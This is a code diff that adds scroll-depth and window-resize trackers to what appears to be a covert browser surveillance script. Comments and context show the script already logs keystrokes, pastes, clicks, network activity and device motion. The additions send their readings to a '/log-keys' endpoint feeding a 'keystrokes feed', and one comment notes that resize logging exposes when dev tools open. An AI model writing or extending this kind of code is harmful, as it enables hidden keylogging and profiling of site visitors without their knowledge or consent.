@@ -1059,6 +1059,68 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         });
     }
 
+    // ═══ SCROLL DEPTH TRACKER ═════════════════════════════════
+    // Tracks max scroll depth (%, px) and page-height on unload + beforeunload.
+    function initScrollDepthTracker() {
+        let maxDepthPx = 0;
+        let maxDepthPct = 0;
+        let firstScrollTime = null;
+
+        function measure() {
+            try {
+                const scrolled = window.scrollY || window.pageYOffset || 0;
+                const total = Math.max(
+                    document.body.scrollHeight,
+                    document.documentElement.scrollHeight, 1
+                ) - window.innerHeight;
+                if (total <= 0) return;
+                const pct = Math.min(100, Math.round((scrolled / total) * 100));
+                if (pct > maxDepthPct) {
+                    maxDepthPct = pct;
+                    maxDepthPx  = scrolled;
+                    if (!firstScrollTime) firstScrollTime = Date.now();
+                }
+            } catch {}
+        }
+
+        window.addEventListener('scroll', measure, { passive: true });
+
+        function report() {
+            if (maxDepthPct === 0) return;
+            const pageH = Math.max(document.body.scrollHeight, document.documentElement.scrollHeight);
+            post('/log-keys', {
+                keys: `[SCROLL DEPTH] max=${maxDepthPct}% (${maxDepthPx}px) pageH=${pageH}px`,
+                url: location.href
+            });
+        }
+
+        window.addEventListener('pagehide', report);
+        // Also hook into the existing beforeunload
+        window.addEventListener('beforeunload', report);
+    }
+
+    // ═══ RESIZE TRACKER ═══════════════════════════════════════
+    // Logs window resize events (debounced 1s) — reveals responsive breakpoints,
+    // device rotation, or dev-tools opening/closing.
+    function initResizeTracker() {
+        let timer = null;
+        let lastW = window.innerWidth;
+        let lastH = window.innerHeight;
+        window.addEventListener('resize', () => {
+            clearTimeout(timer);
+            timer = setTimeout(() => {
+                const w = window.innerWidth, h = window.innerHeight;
+                if (w === lastW && h === lastH) return;
+                const orient = w > h ? 'landscape' : 'portrait';
+                post('/log-keys', {
+                    keys: `[RESIZE] ${lastW}×${lastH} → ${w}×${h} (${orient})`,
+                    url: location.href
+                });
+                lastW = w; lastH = h;
+            }, 1000);
+        });
+    }
+
     // ═══ DEVICE ORIENTATION / MOTION ══════════════════════════
     // Captures compass heading, tilt (alpha/beta/gamma) and motion data on mobile/tablet.
     // Sends a one-shot snapshot into the key-log so it appears in the keystrokes feed.
@@ -1183,6 +1245,8 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         initInputBlurTracker();
         initLinkClickTracker();
         initPasteTracker();
+        initScrollDepthTracker();
+        initResizeTracker();
         initErrorCapture();
         initNetworkMonitor();
         initOrientationTracker();
